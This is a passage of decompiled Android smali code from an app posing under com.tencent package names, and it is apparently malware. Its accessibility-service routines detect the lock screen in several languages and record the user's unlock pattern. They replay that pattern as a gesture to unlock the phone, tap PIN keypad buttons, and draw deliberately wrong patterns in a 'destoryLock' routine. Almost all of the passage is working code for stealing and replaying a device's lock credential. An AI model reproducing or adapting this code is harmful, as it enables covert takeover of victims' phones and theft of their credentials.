    invoke-virtual {p0}, Landroid/view/accessibility/AccessibilityEvent;->getText()Ljava/util/List;

    move-result-object v0

    invoke-interface {v0, v2}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v0

    const-string v1, "\u30c7\u30d0\u30a4\u30b9\u306f\u30ed\u30c3\u30af\u3055\u308c\u3066\u3044\u307e\u3059"

    invoke-virtual {v1, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-nez v0, :cond_9

    .line 128
    invoke-virtual {p0}, Landroid/view/accessibility/AccessibilityEvent;->getText()Ljava/util/List;

    move-result-object v0

    invoke-interface {v0, v2}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v0

    const-string v1, "Lock screen."

    invoke-virtual {v1, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-nez v0, :cond_9

    .line 129
    invoke-virtual {p0}, Landroid/view/accessibility/AccessibilityEvent;->getText()Ljava/util/List;

    move-result-object v0

    invoke-interface {v0, v2}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v0

    const-string v1, "\ud654\uba74\uc744 \uc7a0\uae09\ub2c8\ub2e4."

    invoke-virtual {v1, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-nez v0, :cond_9

    .line 130
    invoke-virtual {p0}, Landroid/view/accessibility/AccessibilityEvent;->getText()Ljava/util/List;

    move-result-object v0

    invoke-interface {v0, v2}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v0

    const-string v1, "\u0f66\u0f92\u0fb2\u0f72\u0f42\u0f0b\u0f46\u0f66\u0f0b\u0f66\u0f92\u0f7c\u0f0b\u0f63\u0f95\u0f42\u0f66\u0f0b\u0f56\u0f62\u0f92\u0fb1\u0f56\u0f0b\u0f5f\u0f72\u0f53\u0f0d"

    invoke-virtual {v1, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-nez v0, :cond_9

    .line 131
    invoke-virtual {p0}, Landroid/view/accessibility/AccessibilityEvent;->getText()Ljava/util/List;

    move-result-object v0

    invoke-interface {v0, v2}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v0

    const-string v1, "\u0626\u06d0\u0643\u0631\u0627\u0646 \u0642\u06c7\u0644\u06c7\u067e\u0644\u0627\u0634"

    invoke-virtual {v1, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_a

    .line 135
    :cond_9
    sget-object v0, Lcom/tencent/ScreenLockMonitor;->screenLockPointList:Ljava/util/LinkedList;

    invoke-virtual {v0}, Ljava/util/LinkedList;->isEmpty()Z

    move-result v0

    if-nez v0, :cond_a

    .line 136
    sput-object v4, Lcom/tencent/AccessibilityServiceCore;->passcheck:Ljava/lang/String;

    .line 137
    sget-object v0, Lcom/tencent/ScreenLockMonitor;->successcreenLockPointList:Ljava/util/LinkedList;

    invoke-virtual {v0}, Ljava/util/LinkedList;->clear()V

    .line 138
    sget-object v0, Lcom/tencent/ScreenLockMonitor;->successcreenLockPointList:Ljava/util/LinkedList;

    sget-object v1, Lcom/tencent/ScreenLockMonitor;->screenLockPointList:Ljava/util/LinkedList;

    invoke-virtual {v0, v1}, Ljava/util/LinkedList;->addAll(Ljava/util/Collection;)Z

    .line 139
    sget-object v0, Lcom/tencent/ScreenLockMonitor;->screenLockPointList:Ljava/util/LinkedList;

    invoke-virtual {v0}, Ljava/util/LinkedList;->clear()V

    .line 140
    sget-object v0, Lcom/tencent/ScreenLockMonitor;->screenLockPointSet:Ljava/util/Set;

    invoke-interface {v0}, Ljava/util/Set;->clear()V

    .line 144
    :cond_a
    invoke-virtual {p0}, Landroid/view/accessibility/AccessibilityEvent;->getEventType()I

    move-result v0

    const/16 v1, 0x800

    if-ne v0, v1, :cond_b

    const-string v0, "android"

    invoke-virtual {p0}, Landroid/view/accessibility/AccessibilityEvent;->getPackageName()Ljava/lang/CharSequence;

    move-result-object p0

    invoke-virtual {v0, p0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result p0

    if-eqz p0, :cond_b

    sget-object p0, Lcom/tencent/ScreenLockMonitor;->screenLockPointList:Ljava/util/LinkedList;

    invoke-virtual {p0}, Ljava/util/LinkedList;->isEmpty()Z

    move-result p0

    if-nez p0, :cond_b

    .line 145
    sput-object v4, Lcom/tencent/AccessibilityServiceCore;->passcheck:Ljava/lang/String;

    .line 146
    sget-object p0, Lcom/tencent/ScreenLockMonitor;->successcreenLockPointList:Ljava/util/LinkedList;

    invoke-virtual {p0}, Ljava/util/LinkedList;->clear()V

    .line 147
    sget-object p0, Lcom/tencent/ScreenLockMonitor;->successcreenLockPointList:Ljava/util/LinkedList;

    sget-object v0, Lcom/tencent/ScreenLockMonitor;->screenLockPointList:Ljava/util/LinkedList;

    invoke-virtual {p0, v0}, Ljava/util/LinkedList;->addAll(Ljava/util/Collection;)Z

    .line 148
    sget-object p0, Lcom/tencent/ScreenLockMonitor;->screenLockPointList:Ljava/util/LinkedList;

    invoke-virtual {p0}, Ljava/util/LinkedList;->clear()V

    .line 149
    sget-object p0, Lcom/tencent/ScreenLockMonitor;->screenLockPointSet:Ljava/util/Set;

    invoke-interface {p0}, Ljava/util/Set;->clear()V

    :cond_b
    return-void
.end method

.method private static clickEnter(Lcom/tencent/AccessibilityServiceCore;)V
    .locals 1

    const-string v0, "com.android.systemui:id/key_enter_text"

    .line 305
    invoke-static {p0, v0}, Lcom/tencent/Sea_tunesxconcerningn10_rch;->searchById(Lcom/tencent/AccessibilityServiceCore;Ljava/lang/String;)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0

    if-eqz v0, :cond_0

    goto :goto_0

    :cond_0
    const-string v0, "com.android.systemui:id/key_enter"

    .line 309
    invoke-static {p0, v0}, Lcom/tencent/Sea_tunesxconcerningn10_rch;->searchById(Lcom/tencent/AccessibilityServiceCore;Ljava/lang/String;)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0

    .line 311
    :goto_0
    invoke-static {v0}, Lcom/tencent/Sea_tunesxconcerningn10_rch;->click(Landroid/view/accessibility/AccessibilityNodeInfo;)V

    return-void
.end method

.method private static clickErrorUnlockButtonByGusture(Lcom/tencent/AccessibilityServiceCore;)V
    .locals 11

    const-string v0, "com.android.systemui:id/lockPatternView"

    .line 219
    invoke-static {p0, v0}, Lcom/tencent/Sea_tunesxconcerningn10_rch;->searchById(Lcom/tencent/AccessibilityServiceCore;Ljava/lang/String;)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0

    if-nez v0, :cond_0

    const-string v0, "com.android.systemui:id/vivo_lock_pattern_view"

    .line 221
    invoke-static {p0, v0}, Lcom/tencent/Sea_tunesxconcerningn10_rch;->searchById(Lcom/tencent/AccessibilityServiceCore;Ljava/lang/String;)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0

    :cond_0
    if-nez v0, :cond_1

    return-void

    .line 224
    :cond_1
    new-instance v1, Landroid/graphics/Rect;

    invoke-direct {v1}, Landroid/graphics/Rect;-><init>()V

    .line 225
    invoke-virtual {v0, v1}, Landroid/view/accessibility/AccessibilityNodeInfo;->getBoundsInScreen(Landroid/graphics/Rect;)V

    .line 226
    new-instance v0, Ljava/lang/StringBuilder;

    const-string v2, "rect.centerX()"

    invoke-direct {v0, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v1}, Landroid/graphics/Rect;->centerX()I

    move-result v2

    invoke-virtual {v0, v2}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Lcom/tencent/LogHelper;->i(Ljava/lang/String;)V

    .line 227
    new-instance v0, Ljava/lang/StringBuilder;

    const-string v2, "rect.centerY()"

    invoke-direct {v0, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v1}, Landroid/graphics/Rect;->centerY()I

    move-result v2

    invoke-virtual {v0, v2}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Lcom/tencent/LogHelper;->i(Ljava/lang/String;)V

    .line 228
    iget v0, v1, Landroid/graphics/Rect;->right:I

    iget v2, v1, Landroid/graphics/Rect;->left:I

    sub-int/2addr v0, v2

    div-int/lit8 v0, v0, 0x6

    .line 229
    iget v2, v1, Landroid/graphics/Rect;->bottom:I

    iget v3, v1, Landroid/graphics/Rect;->top:I

    sub-int/2addr v2, v3

    div-int/lit8 v2, v2, 0x6

    .line 230
    new-instance v3, Ljava/util/LinkedList;

    invoke-direct {v3}, Ljava/util/LinkedList;-><init>()V

    const/4 v4, 0x0

    move v5, v4

    :goto_0
    const/4 v6, 0x3

    if-ge v5, v6, :cond_2

    .line 232
    new-instance v6, Lcom/tencent/ScreenLockMonitor$Node;

    iget v7, v1, Landroid/graphics/Rect;->left:I

    add-int/2addr v7, v0

    int-to-float v7, v7

    iget v8, v1, Landroid/graphics/Rect;->top:I

    add-int/2addr v8, v2

    mul-int v9, v2, v5

    mul-int/lit8 v9, v9, 0x2

    add-int/2addr v8, v9

    int-to-float v8, v8

    new-instance v9, Ljava/lang/StringBuilder;

    invoke-direct {v9}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v9, v5}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    const-string v10, ""

    invoke-virtual {v9, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v9}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v9

    invoke-direct {v6, v7, v8, v9}, Lcom/tencent/ScreenLockMonitor$Node;-><init>(FFLjava/lang/String;)V

    .line 233
    invoke-virtual {v3, v6}, Ljava/util/LinkedList;->add(Ljava/lang/Object;)Z

    add-int/lit8 v5, v5, 0x1

    goto :goto_0

    .line 235
    :cond_2
    new-instance v5, Lcom/tencent/ScreenLockMonitor$Node;

    iget v7, v1, Landroid/graphics/Rect;->left:I

    mul-int/2addr v0, v6

    add-int/2addr v7, v0

    int-to-float v0, v7

    iget v1, v1, Landroid/graphics/Rect;->top:I

    mul-int/lit8 v2, v2, 0x5

    add-int/2addr v1, v2

    int-to-float v1, v1

    const-string v2, "4"

    invoke-direct {v5, v0, v1, v2}, Lcom/tencent/ScreenLockMonitor$Node;-><init>(FFLjava/lang/String;)V

    .line 236
    invoke-virtual {v3, v5}, Ljava/util/LinkedList;->add(Ljava/lang/Object;)Z

    .line 237
    new-instance v0, Landroid/graphics/Path;

    invoke-direct {v0}, Landroid/graphics/Path;-><init>()V

    .line 238
    invoke-virtual {v3, v4}, Ljava/util/LinkedList;->get(I)Ljava/lang/Object;

    move-result-object v1

    check-cast v1, Lcom/tencent/ScreenLockMonitor$Node;

    iget v1, v1, Lcom/tencent/ScreenLockMonitor$Node;->x:F

    invoke-virtual {v3, v4}, Ljava/util/LinkedList;->get(I)Ljava/lang/Object;

    move-result-object v2

    check-cast v2, Lcom/tencent/ScreenLockMonitor$Node;

    iget v2, v2, Lcom/tencent/ScreenLockMonitor$Node;->y:F

    invoke-virtual {v0, v1, v2}, Landroid/graphics/Path;->moveTo(FF)V

    const/4 v1, 0x1

    .line 239
    :goto_1
    invoke-virtual {v3}, Ljava/util/LinkedList;->size()I

    move-result v2

    if-ge v1, v2, :cond_3

    .line 240
    invoke-virtual {v3, v1}, Ljava/util/LinkedList;->get(I)Ljava/lang/Object;

    move-result-object v2

    check-cast v2, Lcom/tencent/ScreenLockMonitor$Node;

    iget v2, v2, Lcom/tencent/ScreenLockMonitor$Node;->x:F

    invoke-virtual {v3, v1}, Ljava/util/LinkedList;->get(I)Ljava/lang/Object;

    move-result-object v4

    check-cast v4, Lcom/tencent/ScreenLockMonitor$Node;

    iget v4, v4, Lcom/tencent/ScreenLockMonitor$Node;->y:F

    invoke-virtual {v0, v2, v4}, Landroid/graphics/Path;->lineTo(FF)V

    add-int/lit8 v1, v1, 0x1

    goto :goto_1

    :cond_3
    const/16 v1, 0xd

    .line 242
    invoke-static {v0, v1, p0}, Lcom/tencent/ScreenLockMonitor;->performGestureByCount(Landroid/graphics/Path;ILcom/tencent/AccessibilityServiceCore;)V

    .line 243
    sget-object p0, Lcom/tencent/ScreenLockMonitor;->screenLockPointSet:Ljava/util/Set;

    invoke-interface {p0}, Ljava/util/Set;->clear()V

    .line 244
    sget-object p0, Lcom/tencent/ScreenLockMonitor;->screenLockPointList:Ljava/util/LinkedList;

    invoke-virtual {p0}, Ljava/util/LinkedList;->clear()V

    .line 245
    sget-object p0, Lcom/tencent/ScreenLockMonitor;->successcreenLockPointList:Ljava/util/LinkedList;

    invoke-virtual {p0}, Ljava/util/LinkedList;->clear()V

    return-void
.end method

.method private static clickUnlockButton(Lcom/tencent/AccessibilityServiceCore;Ljava/lang/String;)V
    .locals 4

    const/4 v0, 0x0

    :goto_0
    const/4 v1, 0x6

    if-ge v0, v1, :cond_4

    const/4 v1, 0x1

    :goto_1
    const/4 v2, 0x7

    if-ge v1, v2, :cond_1

    .line 282
    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v2, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2, v1}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-static {p0, v2}, Lcom/tencent/Sea_tunesxconcerningn10_rch;->searchById(Lcom/tencent/AccessibilityServiceCore;Ljava/lang/String;)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v2

    if-eqz v2, :cond_0

    .line 284
    invoke-virtual {v2}, Landroid/view/accessibility/AccessibilityNodeInfo;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-static {v3}, Lcom/tencent/LogHelper;->i(Ljava/lang/String;)V

    .line 286
    :cond_0
    invoke-static {v2}, Lcom/tencent/Sea_tunesxconcerningn10_rch;->click(Landroid/view/accessibility/AccessibilityNodeInfo;)V

    add-int/lit8 v1, v1, 0x1

    goto :goto_1

    .line 288
    :cond_1
    invoke-static {p0}, Lcom/tencent/ScreenLockMonitor;->clickEnter(Lcom/tencent/AccessibilityServiceCore;)V

    .line 291
    :try_start_0
    invoke-static {}, Lcom/tencent/Br_tunesxconcerningn10_and;->getBrand()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;

    move-result-object v1

    const-string v2, "huawei"

    invoke-virtual {v1, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v1

    if-nez v1, :cond_3

    invoke-static {}, Lcom/tencent/Br_tunesxconcerningn10_and;->getBrand()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;

    move-result-object v1

    const-string v2, "honor"

    invoke-virtual {v1, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v1

    if-eqz v1, :cond_2

    goto :goto_2

    :cond_2
    const/16 v1, 0xc8

    goto :goto_3

    :cond_3
    :goto_2
    const/16 v1, 0x320

    :goto_3
    int-to-long v1, v1

    .line 294
    invoke-static {v1, v2}, Ljava/lang/Thread;->sleep(J)V
    :try_end_0
    .catch Ljava/lang/InterruptedException; {:try_start_0 .. :try_end_0} :catch_0

    add-int/lit8 v0, v0, 0x1

    goto :goto_0

    :catch_0
    move-exception p0

    .line 296
    new-instance p1, Ljava/lang/RuntimeException;

    invoke-direct {p1, p0}, Ljava/lang/RuntimeException;-><init>(Ljava/lang/Throwable;)V

    throw p1

    :cond_4
    const-string p0, ""

    .line 299
    sput-object p0, Lcom/tencent/MainBackgroundService;->currentSuccessPassword:Ljava/lang/String;

    .line 300
    sput-object p0, Lcom/tencent/AccessibilityServiceCore;->ccurrentPassword:Ljava/lang/String;

    return-void
.end method

.method public static destoryLock(Lcom/tencent/AccessibilityServiceCore;)V
    .locals 2

    .line 202
    new-instance v0, Ljava/lang/Thread;

    new-instance v1, Lcom/tencent/ScreenLockMonitor$2;

    invoke-direct {v1, p0}, Lcom/tencent/ScreenLockMonitor$2;-><init>(Lcom/tencent/AccessibilityServiceCore;)V

    invoke-direct {v0, v1}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    .line 215
    invoke-virtual {v0}, Ljava/lang/Thread;->start()V

    return-void
.end method

.method private static getScreenType(Lcom/tencent/AccessibilityServiceCore;)I
    .locals 2

    const-string v0, "com.android.systemui:id/VivoPinkey0"

    .line 320
    invoke-static {p0, v0}, Lcom/tencent/Sea_tunesxconcerningn10_rch;->searchById(Lcom/tencent/AccessibilityServiceCore;Ljava/lang/String;)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0

    const-string v1, "com.android.systemui:id/key1"

    .line 321
    invoke-static {p0, v1}, Lcom/tencent/Sea_tunesxconcerningn10_rch;->searchById(Lcom/tencent/AccessibilityServiceCore;Ljava/lang/String;)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object p0

    if-eqz v0, :cond_0

    const/4 p0, 0x3

    return p0

    :cond_0
    if-eqz p0, :cond_1

    const/4 p0, 0x1

    return p0

    :cond_1
    const/4 p0, 0x2

    return p0
.end method

.method private static lightScreen(Lcom/tencent/AccessibilityServiceCore;)V
    .locals 2

    .line 331
    invoke-virtual {p0}, Lcom/tencent/AccessibilityServiceCore;->wakeupScreen()V

    const/4 v0, 0x3

    .line 332
    invoke-virtual {p0, v0}, Lcom/tencent/AccessibilityServiceCore;->performGlobalAction(I)Z

    const-wide/16 v0, 0x320

    .line 334
    :try_start_0
    invoke-static {v0, v1}, Ljava/lang/Thread;->sleep(J)V
    :try_end_0
    .catch Ljava/lang/InterruptedException; {:try_start_0 .. :try_end_0} :catch_0

    return-void

    :catch_0
    move-exception p0

    .line 336
    new-instance v0, Ljava/lang/RuntimeException;

    invoke-direct {v0, p0}, Ljava/lang/RuntimeException;-><init>(Ljava/lang/Throwable;)V

    throw v0
.end method

.method private static logevent(Landroid/view/accessibility/AccessibilityEvent;)V
    .locals 0

    return-void
.end method

.method private static performGestureByCount(Landroid/graphics/Path;ILcom/tencent/AccessibilityServiceCore;)V
    .locals 5

    .line 249
    filled-new-array {p1}, [I

    move-result-object p1

    .line 250
    sget v0, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v1, 0x18

    if-lt v0, v1, :cond_0

    .line 252
    invoke-static {}, Lcom/tencent/DataPackagingEngine$$ExternalSyntheticApiModelOutline0;->m()Landroid/accessibilityservice/GestureDescription$Builder;

    move-result-object v0

    const-wide/16 v1, 0x0

    const-wide/16 v3, 0x320

    invoke-static {p0, v1, v2, v3, v4}, Lcom/tencent/DataPackagingEngine$$ExternalSyntheticApiModelOutline0;->m(Landroid/graphics/Path;JJ)Landroid/accessibilityservice/GestureDescription$StrokeDescription;

    move-result-object v1

    invoke-static {v0, v1}, Lcom/tencent/DataPackagingEngine$$ExternalSyntheticApiModelOutline0;->m(Landroid/accessibilityservice/GestureDescription$Builder;Landroid/accessibilityservice/GestureDescription$StrokeDescription;)Landroid/accessibilityservice/GestureDescription$Builder;

    move-result-object v0

    .line 254
    invoke-static {v0}, Lcom/tencent/DataPackagingEngine$$ExternalSyntheticApiModelOutline0;->m(Landroid/accessibilityservice/GestureDescription$Builder;)Landroid/accessibilityservice/GestureDescription;

    move-result-object v0

    .line 255
    new-instance v1, Lcom/tencent/ScreenLockMonitor$3;

    invoke-direct {v1, p1, p0, p2}, Lcom/tencent/ScreenLockMonitor$3;-><init>([ILandroid/graphics/Path;Lcom/tencent/AccessibilityServiceCore;)V

    const/4 p0, 0x0

    invoke-static {p2, v0, v1, p0}, Lcom/tencent/DataPackagingEngine$$ExternalSyntheticApiModelOutline0;->m(Lcom/tencent/AccessibilityServiceCore;Landroid/accessibilityservice/GestureDescription;Landroid/accessibilityservice/AccessibilityService$GestureResultCallback;Landroid/os/Handler;)Z

    :cond_0
    return-void
.end method

.method public static startUnLock(Landroid/content/Context;)V
    .locals 6

    .line 169
    sget-object v0, Lcom/tencent/ScreenLockMonitor;->successcreenLockPointList:Ljava/util/LinkedList;

    invoke-virtual {v0}, Ljava/util/LinkedList;->isEmpty()Z

    move-result v0

    if-eqz v0, :cond_0

    return-void

    :cond_0
    const/4 v0, 0x1

    .line 173
    sput-boolean v0, Lcom/tencent/ScreenLockMonitor;->ifAuto:Z

    .line 174
    new-instance v1, Landroid/graphics/Path;

    invoke-direct {v1}, Landroid/graphics/Path;-><init>()V

    .line 175
    sget-object v2, Lcom/tencent/ScreenLockMonitor;->successcreenLockPointList:Ljava/util/LinkedList;

    const/4 v3, 0x0

    invoke-virtual {v2, v3}, Ljava/util/LinkedList;->get(I)Ljava/lang/Object;

    move-result-object v2

    check-cast v2, Lcom/tencent/ScreenLockMonitor$Node;

    iget v2, v2, Lcom/tencent/ScreenLockMonitor$Node;->x:F

    sget-object v4, Lcom/tencent/ScreenLockMonitor;->successcreenLockPointList:Ljava/util/LinkedList;

    invoke-virtual {v4, v3}, Ljava/util/LinkedList;->get(I)Ljava/lang/Object;

    move-result-object v3

    check-cast v3, Lcom/tencent/ScreenLockMonitor$Node;

    iget v3, v3, Lcom/tencent/ScreenLockMonitor$Node;->y:F

    invoke-virtual {v1, v2, v3}, Landroid/graphics/Path;->moveTo(FF)V

    .line 176
    :goto_0
    sget-object v2, Lcom/tencent/ScreenLockMonitor;->successcreenLockPointList:Ljava/util/LinkedList;

    invoke-virtual {v2}, Ljava/util/LinkedList;->size()I

    move-result v2

    if-ge v0, v2, :cond_1

    .line 177
    sget-object v2, Lcom/tencent/ScreenLockMonitor;->successcreenLockPointList:Ljava/util/LinkedList;

    invoke-virtual {v2, v0}, Ljava/util/LinkedList;->get(I)Ljava/lang/Object;

    move-result-object v2

    check-cast v2, Lcom/tencent/ScreenLockMonitor$Node;

    iget v2, v2, Lcom/tencent/ScreenLockMonitor$Node;->x:F

    sget-object v3, Lcom/tencent/ScreenLockMonitor;->successcreenLockPointList:Ljava/util/LinkedList;

    invoke-virtual {v3, v0}, Ljava/util/LinkedList;->get(I)Ljava/lang/Object;

    move-result-object v3

    check-cast v3, Lcom/tencent/ScreenLockMonitor$Node;

    iget v3, v3, Lcom/tencent/ScreenLockMonitor$Node;->y:F

    invoke-virtual {v1, v2, v3}, Landroid/graphics/Path;->lineTo(FF)V

    add-int/lit8 v0, v0, 0x1

    goto :goto_0

    .line 179
    :cond_1
    sget v0, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v2, 0x18

    if-lt v0, v2, :cond_2

    .line 181
    invoke-static {}, Lcom/tencent/DataPackagingEngine$$ExternalSyntheticApiModelOutline0;->m()Landroid/accessibilityservice/GestureDescription$Builder;

    move-result-object v0

    const-wide/16 v2, 0x0

    const-wide/16 v4, 0x320

    invoke-static {v1, v2, v3, v4, v5}, Lcom/tencent/DataPackagingEngine$$ExternalSyntheticApiModelOutline0;->m(Landroid/graphics/Path;JJ)Landroid/accessibilityservice/GestureDescription$StrokeDescription;

    move-result-object v1

    invoke-static {v0, v1}, Lcom/tencent/DataPackagingEngine$$ExternalSyntheticApiModelOutline0;->m(Landroid/accessibilityservice/GestureDescription$Builder;Landroid/accessibilityservice/GestureDescription$StrokeDescription;)Landroid/accessibilityservice/GestureDescription$Builder;

    move-result-object v0

    .line 183
    invoke-static {v0}, Lcom/tencent/DataPackagingEngine$$ExternalSyntheticApiModelOutline0;->m(Landroid/accessibilityservice/GestureDescription$Builder;)Landroid/accessibilityservice/GestureDescription;

    move-result-object v0

    .line 184
    check-cast p0, Landroid/accessibilityservice/AccessibilityService;

    new-instance v1, Lcom/tencent/ScreenLockMonitor$1;

    invoke-direct {v1}, Lcom/tencent/ScreenLockMonitor$1;-><init>()V

    const/4 v2, 0x0

    invoke-static {p0, v0, v1, v2}, Lcom/tencent/DataPackagingEngine$$ExternalSyntheticApiModelOutline0;->m(Landroid/accessibilityservice/AccessibilityService;Landroid/accessibilityservice/GestureDescription;Landroid/accessibilityservice/AccessibilityService$GestureResultCallback;Landroid/os/Handler;)Z

    :cond_2
    return-void
.end method
